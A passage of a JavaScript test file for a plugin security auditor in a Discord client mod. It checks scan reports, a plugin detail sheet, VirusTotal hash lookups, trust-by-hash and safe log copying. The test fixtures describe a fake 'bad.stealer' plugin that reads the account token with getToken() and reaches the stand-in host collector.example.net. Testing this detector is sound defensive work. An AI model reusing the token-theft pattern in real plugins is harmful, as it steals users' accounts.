		check('Copy report holds the counts, the worst plugins and the links', /Scanned 6 plugins via native list, 2 need attention/.test(report) && report.includes('Totally Legit') && report.includes('collector.example.net') && report.includes('DUPLICATES'), report)
		check('the report is clear that it is not a verdict', report.includes('not proof'))
		check('the report has short samples but never a whole plugin', report.includes('AuthenticationStore.getToken()') && !report.includes(fakePlugins[1].script))
		await s.running.stop()
	}

	// --- Plugin sheet
	{
		const s = await setup()
		const view = await s.mountSettings()
		await press(view, 'Scan now')
		await sleep(50)
		await view.settle()
		row(view, 'Totally Legit').props.onPress()
		await sleep(5)
		const call = s.runtime.log.actions.filter(a => a.label === 'actionSheet' && a.name === 'openLazy').at(-1)
		check('tapping a plugin opens its sheet', call?.args[1] === 'marklong.plugin-auditor.plugin', call)
		const Sheet = (await call.args[0]).default
		const sheet = s.runtime.mount(s.runtime.React.createElement(Sheet, {}))
		await sheet.settle()
		const text = textOf(sheet.tree)
		check('the sheet shows the name, id and a critical badge', text.includes('Totally Legit') && text.includes('bad.stealer') && text.includes('CRITICAL'), text.slice(0, 300))
		check('the sheet explains the combo and the findings with code samples', text.includes('Can read your token and reach the internet') && text.includes('Reads your account token') && text.includes('getToken('), text.slice(0, 900))
		check('the sheet lists the link and calls it unknown', text.includes('https://collector.example.net/t?x=') && text.includes('UNKNOWN'))
		check('without a key the sheet offers the VirusTotal pages, not Check', !!button(sheet, 'Open VirusTotal') && !button(sheet, 'Check') && text.includes('Add a free VirusTotal key'))
		button(sheet, 'Open VirusTotal').props.onPress()
		await sleep(5)
		const hash = kit.sha256(fakePlugins[1].script)
		check('Open VirusTotal opens the file page by hash', (globalThis.__opened ?? []).at(-1) === `https://www.virustotal.com/gui/file/${hash}`, globalThis.__opened)
		button(sheet, 'Copy report').props.onPress()
		check('the sheet can copy its own report', s.copied.at(-1).startsWith('Totally Legit 1.0.0 (bad.stealer) by tester') && s.copied.at(-1).includes('Risk: Critical'))

		// accept
		button(sheet, 'I checked it').props.onPress()
		await sleep(10)
		await sheet.settle()
		check('"I checked it" saves the plugin with the hash of its code', s.storage.cache.trusted['bad.stealer'] === hash, s.storage.cache.trusted)
		check('and the plugin no longer counts as needing attention', /1 plugin needs attention/.test(textOf((await s.mountSettings()).tree)))
		button(sheet, 'Stop accepting').props.onPress()
		await sleep(10)
		check('"Stop accepting" really removes it (not merged back)', !('bad.stealer' in s.storage.cache.trusted), s.storage.cache.trusted)
		await s.running.stop()
	}

	// --- Changed code is no longer accepted
	{
		const s = await setup({ saved: { trusted: { 'bad.stealer': 'oldhash' } } })
		const view = await s.mountSettings()
		await press(view, 'Scan now')
		await sleep(50)
		await view.settle()
		check('an accepted plugin whose code changed counts again', /2 plugins need attention/.test(textOf(view.tree)))
		await s.running.stop()
	}

	// --- VirusTotal from the sheet
	{
		const s = await setup({ saved: { vtKey: 'KEY123', vtFast: true } })
		const realFetch = globalThis.fetch
		const realSetTimeout = globalThis.setTimeout
		globalThis.setTimeout = (fn, ms, ...rest) => realSetTimeout(fn, ms > 50 ? 0 : ms, ...rest)
		const requests = []
		let mode = 'found'
		globalThis.fetch = async (url, init = {}) => {
			requests.push({ url: String(url), method: init.method })
			if (String(url).includes('/files/')) {
				if (mode === 'unknown') return { status: 404, ok: false, json: async () => ({}) }
				return { status: 200, ok: true, json: async () => ({ data: { attributes: { last_analysis_stats: { malicious: 3, suspicious: 0, harmless: 10, undetected: 50 }, last_analysis_results: { Eng: { category: 'malicious', result: 'JS.Bad' } } } } }) }
			}
			if (String(url).includes('/domains/')) return { status: 200, ok: true, json: async () => ({ data: { attributes: { last_analysis_stats: { malicious: 0, suspicious: 0, harmless: 9, undetected: 60 } } } }) }
			return { status: 200, ok: true, json: async () => ({}) }
		}
		try {
			const view = await s.mountSettings()
			await press(view, 'Scan now')
			await sleep(50)
			await view.settle()
			row(view, 'Totally Legit').props.onPress()
			await sleep(5)
			const call = s.runtime.log.actions.filter(a => a.label === 'actionSheet' && a.name === 'openLazy').at(-1)
			const Sheet = (await call.args[0]).default
			const sheet = s.runtime.mount(s.runtime.React.createElement(Sheet, {}))
			await sheet.settle()
			check('with a key the sheet offers Check and Upload code', !!button(sheet, 'Check') && !!button(sheet, 'Upload code'))
			button(sheet, 'Check').props.onPress()
			await sleep(60)
			await sheet.settle()
			const t = textOf(sheet.tree)
			check('Check asks VirusTotal by hash only and shows the answer', requests.length === 1 && requests[0].method === 'GET' && requests[0].url.endsWith(`/files/${kit.sha256(fakePlugins[1].script)}`) && t.includes('3 engines call it malicious') && t.includes('Eng: JS.Bad'), { requests, t: t.slice(-400) })
			check('the answer is saved so it is there next time', Object.keys(s.storage.cache.vtCache).length === 1)
			check('the saved answer does not hold the key', !JSON.stringify(s.storage.cache.vtCache).includes('KEY123'))

			// Upload asks first
			const alerts = []
			s.runtime.valenced.react.ReactNative.Alert = { alert: (...args) => alerts.push(args) }
			button(sheet, 'Upload code').props.onPress()
			check('Upload code asks before sending anything', alerts.length === 1 && /Upload this plugin to VirusTotal/.test(alerts[0][0]) && requests.length === 1, alerts[0]?.[0])
			check('and the question says the code is shared', /shares uploaded files with security companies/.test(alerts[0][1]))
			await s.running.stop()
		} finally {
			globalThis.fetch = realFetch
			globalThis.setTimeout = realSetTimeout
		}
	}

	// --- When listing fails
	{
		const s = await setup({ listFails: true })
		const view = await s.mountSettings()
		await press(view, 'Scan now')
		await sleep(30)
		await view.settle()
		const text = textOf(view.tree)
		check('when Valenced will not list plugins the screen says the scan could not run', text.includes('The scan could not run') && text.includes('would not list the installed plugins'), text.slice(0, 400))
		check('and says to copy the logs', text.includes('Copy the logs'))
		const copyLogs = findNode(view.tree, n => n.type === 'Design.Button' && n.props.text === 'Copy logs')
		copyLogs.props.onPress()
		const report = s.copied.at(-1)
		check('the logs hold the failure of the native list', /native list failed: Call failed: no such method/.test(report) && /FAIL Valenced lists the installed plugins/.test(report), report.slice(0, 1500))
		check('the logs name the error event', /ERROR \[source\]/.test(report))
		await s.running.stop()
	}

	// --- Options matter
	{
		const s = await setup({ saved: { includeBuiltIn: true, includeSelf: true } })
		const view = await s.mountSettings()
		await press(view, 'Scan now')
		await sleep(50)
		await view.settle()
		check('with built-in and itself included all 8 are scanned', /8 plugins scanned/.test(textOf(view.tree)), textOf(view.tree).slice(0, 300))
		await s.running.stop()
	}

	// --- Copy logs content
	{
		const s = await setup({ saved: { vtKey: 'SECRETKEY999' } })
		const view = await s.mountSettings()
		await press(view, 'Scan now')
		await sleep(50)
		await view.settle()
		findNode(view.tree, n => n.type === 'Design.Button' && n.props.text === 'Copy logs').props.onPress()
		const report = s.copied.at(-1)
		check('the debug report names the plugin, the phone and Discord', report.startsWith('Plugin Auditor debug report') && report.includes('marklong.plugin-auditor 1.0.0') && report.includes('Discord: 354.5'), report.slice(0, 400))
		check('it shows how the scan went', report.includes('Plugin list: native list') && report.includes('Scanned: 6 plugins, 1 duplicate group(s)') && /Rules: \d+/.test(report) && report.includes('Slowest:'), report)
		check('it lists every plugin with risk, counts, size and a short hash but no code', /bad\.stealer 1\.0\.0 critical \d+f \d+l \d+ch [0-9a-f]{10}/.test(report) && !report.includes('collector.example.net/t?x'), report)
		check('it says which plugin Valenced gave no code for', report.includes('No code from Valenced for: empty.nocode'))
		check('it counts which rules matched', /Rules that matched \(plugins\): .*token\.read=1/.test(report))
		check('the VirusTotal key is never in the report', !report.includes('SECRETKEY999') && report.includes('VirusTotal key: set') && /"vtKey": "set"/.test(report))
		check('the self-check results are in it', /ok\s+SHA-256 works on this phone/.test(report) && /ok\s+Regular expressions support/.test(report) && /FAIL Valenced gave code for every plugin/.test(report))
		check('events are listed oldest first with the scan summary', /\[scan\] 6 plugins in \d+ ms, 1 duplicate group/.test(report))
		await s.running.stop()
	}

	// --- Auto scan and the toast
	{
		const s = await setup({ saved: { autoScan: true, notify: true } })
		check('auto scan is waiting, not run at once', s.nativeCalls.length === 0)
		await s.running.stop()
		check('stopping cancels the waiting scan', s.nativeCalls.length === 0)
	}
}
